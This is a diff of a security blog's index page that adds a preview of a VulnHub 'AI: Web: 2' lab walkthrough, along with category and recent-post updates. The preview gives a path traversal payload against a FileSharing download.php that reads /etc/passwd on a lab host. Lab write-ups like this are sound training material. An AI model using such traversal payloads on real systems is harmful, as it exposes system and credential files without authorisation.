@@ -137,6 +137,44 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/06/06/Easy-AI_Web_2/" >Easy-AI_Web_2</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-06-06  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-2,357/">AI: Web: 2 ~ VulnHub</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><img src="/Rxi134_FILE/9c5e37455a54f557b07e1321cb8da7a3_MD5.jpeg"></p>
+<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Rxi134_FILE/945949733b182b78582a5e5d68a3f829_MD5.jpeg"></p>
+<p>是个登录界面<br><img src="/Rxi134_FILE/9347ffe79c10443dde93f42085eef40f_MD5.jpeg"><br>可以注册进去<br><img src="/Rxi134_FILE/b3046717c69370c5f1f12ca23806c12e_MD5.jpeg"><br>XuezhuLi FileSharing？搜索一下有目录遍历<br><img src="/Rxi134_FILE/5deba8eebc0a0719dd778dd1d100764c_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">/vul_test/FileSharing/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>这边扫下目录，正好扫到一个download.php，直接利用</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">http://192.168.50.139/download.php?file_name=../../../../../../../../../../../../../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/a07934496e60f968e52cd7884bb8d5c5_MD5.jpeg"><br>成功触发</p>
+	
+	</div>
+  <a type="button" href="/2024/06/06/Easy-AI_Web_2/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/06/05/Easy-AI_Web_1/" >Easy-AI_Web_1</a>
 		</h3>
 		</div>
@@ -219,7 +257,7 @@ Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-row
 		
 			<li><a href="/categories/CTFpwn/">CTFpwn<span>2</span></a></li>
 		
-			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>6</span></a></li>
+			<li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>7</span></a></li>
 		
 			<li><a href="/categories/逆向工程/">逆向工程<span>3</span></a></li>
 		
@@ -234,11 +272,11 @@ Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-row
 		
 			<li><a href="/tags/AV/">AV<span>3</span></a></li>
 		
-			<li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>2</span></a></li>
+			<li><a href="/tags/赛题/">赛题<span>2</span></a></li>
+		
+			<li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>3</span></a></li>
 		
 			<li><a href="/tags/靶场/">靶场<span>4</span></a></li>
-		
-			<li><a href="/tags/赛题/">赛题<span>2</span></a></li>
 		
 		 
 		</ul>
@@ -250,6 +288,10 @@ Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-row
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/11/16/ATT&amp;CK红队评估实战靶场-4/" ><i class="fa fa-file-o"></i>ATT&amp;CK红队评估实战靶场-4</a>
+      </li>
     
       <li>
         <a href="/2024/10/15/春秋云镜-Initial/" ><i class="fa fa-file-o"></i>春秋云镜-Initial</a>
@@ -265,10 +307,6 @@ Disallow: /se3reTdir777/uploads/<span aria-hidden="true" class="line-numbers-row
     
       <li>
         <a href="/2024/10/05/8.Portable Executable Format 可移植可执行格式/" ><i class="fa fa-file-o"></i>8.Portable Executable Forma...</a>
-      </li>
-    
-      <li>
-        <a href="/2024/10/03/7.Introduction To The Windows API 对windows API的介绍/" ><i class="fa fa-file-o"></i>7.Introduction To The Windo...</a>
       </li>
     
   </ul>
